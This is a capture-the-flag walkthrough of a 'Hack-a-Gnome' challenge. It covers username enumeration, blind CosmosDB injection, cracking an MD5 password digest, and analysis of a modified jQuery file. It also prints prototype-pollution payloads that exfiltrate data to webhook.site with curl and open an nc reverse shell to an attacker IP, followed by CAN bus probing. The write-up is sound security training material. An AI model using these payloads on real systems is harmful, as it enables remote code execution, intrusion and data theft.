# Hack-a-Gnome
<img src="./images/media/image196.png" />

When we first open up the challenge, we are presented with a login page.

<img src="./images/media/image198.png" /> 

If we go to the Registration page, we see that when we start typing a username, there is validation checking if it is available or not.

<img src="./images/media/image197.png"/>

<img src="./images/media/image199.png"/>

If we try to register a new user, we also see that the registration is currently closed. Let's see if we can enumerate some valid users and then authenticate that way.

<img src="./images/media/image200.png"/>

We can produce an error by adding the quotation mark after the username. This produces an error showing "Microsoft.Azure.Documents.Common/2.14.0" which lets us know this is a CosmosDB system

We can get an easy list of popular names from <https://www.ssa.gov/oact/babynames/decades/century.html>

<img src="./images/media/image201.png"/>

This list provides the 100 most popular male and female English names over the last 100 years. We can go into BurpSuite and run an Intruder attack on the registration page to see if any of these names are currently registered.

<img src="./images/media/image202.png"/>

We could do a blind bruteforce attack on this page as well, but that will take significantly longer and a dictionary attack should hopefully give us a quick win!

<img src="./images/media/image203.png" />

Harold and Bruce each have a Length of 279, while all others are 278, so that identifies to us that these two names are both unavailable in the system and therefore are names we should look into figuring out creds for!

Let's do some enumeration on the site code by looking at /static/jquery.min.js.

Based on HTTP headers and the file content, here is an analysis of the file.

This file appears to be a standard jQuery v3.7.1 library, however, it has been modified.

While the first 99% of the file is valid, minified jQuery code, some interesting script has been appended to the very end of the file (lines 87-92).

**1. HTTP Header Analysis**

-   **Server:** X-Powered-By: Express indicates the backend is running Node.js.

-   **Dates:** The file was modified on Nov 11, 2025, and requested on Nov 30, 2025.

-   **Caching:** Cache-Control: public, max-age=0 suggests the server wants the browser to re-validate the file every time, ensuring the user always gets this specific version (potentially ensuring the payload executes).

**2. The Payload Analysis**

The interesting code is found at the very end of the file.

<img src="./images/media/image204.png"/>

**3. Functionality Breakdown**

1.  **Shadow Input Creation:** It creates a hidden input field with the ID NEWU5ERNAME. This is a visual spoof of NEWUSERNAME (using a 5 instead of S).

2.  **Data Mirroring:** It attaches an event listener to the *real* field (NEWUSERNAME). Every time the user types into the real field, the script copies that data into the hidden malicious field.

3.  **Specific Sanitization:** The script actively strips specific characters from the shadowed input:

    -   **\\ (Backslash)**

    -   **/ (Forward slash)**

    -   **" (Double quote)**

**4. Tactical Implications**

This script serves a specific purpose:

1.  **Parameter Pollution / Confusion:** When the form is submitted, the browser will likely send *both* NEWUSERNAME (the real one) and NEWU5ERNAME (the hidden one). If the backend iterates over parameters or uses loose matching (e.g., fuzzy searching for "username"), it might process the hidden input instead of the real one.

2.  **Sanitization Bypass (or Enforcement):**

    -   The script forces the removal of slashes and quotes.

    -   Trying to perform an injection attack (like SQL Injection or Command Injection) that relies on quotes (") or directory paths (/ or \\, this script renders the exploit impossible *if* the backend prioritizes the NEWU5ERNAME field.

    -   Conversely, if the backend *requires* sanitization and you are the attacker, this script might be "helping" the payload pass a filter that blocks those characters.

<img src="./images/media/image205.png" />

Knowing this information, we can craft a python script to do some blind injection and determine the JSON related to each of these users!

<img src="./images/media/image206.png"/>

There’s nothing which stands out specifically with a name of “password”, however the “digest” field appears to be an md5 hash. We can take that to <http://crackstation.net> and see what we get.

It looks like `oatmeal!!` could potentially be the password for the user harold.

<img src="./images/media/image207.png"/>

We can perform the same tasks with the user bruce and we get the following `oatmeal12`

Now, if we go back to our login, we can try the login of `harold:oatmeal!!` and we see that we get logged in to the Smart Gnome Control Center!

<img src="./images/media/image208.png" />

We are unable to move the robot with the arrow or WASD keys, so we’re going to need to do some more digging to see if we can fix that. Let’s see what we are able to do though.

If we click on "Update Name" we can change the name of our robot. We have to click on Refresh to see the change in the left window. We can then capture this request in Burp Suite and send it to repeater to play around with.

<img src="./images/media/image209.png"/>

<img src="./images/media/image210.png"/>

It looks like we’ve got some encoding and obfuscation to deal with. It looks like there’s some URL encoding going on at the least, so that gives us some place to start. We can play around with some prototype pollution and send a payload to <https://webhook.site> and see if we can get anything to reach out.

`{"action":"update","key":"\_\_proto\_\_","subkey":"outputFunctionName","value":"x;process.mainModule.require('child\_process').execSync('ls | base64 | curl -X POST --data-binary @- https://webhook.site/&lt;ENTER UID HERE');x"}`

<img src="./images/media/image211.png"/>

We can put that through CyberChef to get our encoded payload and then submit it with BurpSuite Repeater.

We see that we get a return back in our webhook site, so we can then take the b64 encoded string back to CyberChef and we see that our payload worked and we have the directory listing!

<img src="./images/media/image212.png" />

Looks like we have some files. We can issue the cat command to pull them and read the file contents.

<img src="./images/media/image214.png" />
<img src="./images/media/image213.png" /> 

Awesome! Now, let’s kick it up a notch and see if we can use the following code to get a reverse shell. 

`{"action":"update","key":"\_\_proto\_\_","subkey":"outputFunctionName","value":"x;process.mainModule.require('child\_process').execSync('nc -e /bin/bash &lt;ATTACK IP&gt; 31337');x"}`

<img src="./images/media/image215.png" />

Bingo!! We have a reverse shell. We can do a quick `whoami` and see that we are root!! To make it easier to work with, we can upgrade our shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and then press CTL+z and type 
```
stty size; stty raw -echo; fg  
stty rows 38 cols 172  
export TERM=xterm-256color
```

And then when we go back to our shell, we have a fully interactive and stable shell that allows for history, using the arrow keys, and is more stable to work with.

We can start examining the other files now a lot easier. If we examine canbus\_client.py, we see that it looks like an update was performed at some point and the CAN IDs for 0x656 through 0x659 are being ignored. What we need to do is send all of the CAN IDs and then verify which ones are mapped to the direction controls of the robot. We can create a python script to scan through the codes and then return back which ones are valid. We do need to tell it to ignore the “background chatter” such as heartbeats and sensors, otherwise it will show every code as being valid. If we are watching in the Smart Gnome Control Center window, we will see the robot move whenever the valid CAN IDs are found. 

<img src="./images/media/image218.png" />
<img src="./images/media/image216.png" />
<img src="./images/media/image217.png" />

At this point, it looks like we have valid IDs of 0x201 through 0x204! We can create another python script to test out which IDs correlate with which direction.

<img src="./images/media/image219.png" /> 

<img src="./images/media/image220.png"/>

<img src="./images/media/image221.png"/>

<img src="./images/media/image223.png" />

<img src="./images/media/image224.png"/>

Once We have a grasp of which codes correspond to which direction, then we can maneuver the robot through the maze, pushing crates out of the way, and then make it over to the power switch and turn off the power to the factory!

One more challenge down! Now let’s head back over and talk with Kevin in the Retro Shop again and see what his next challenge is for us.  
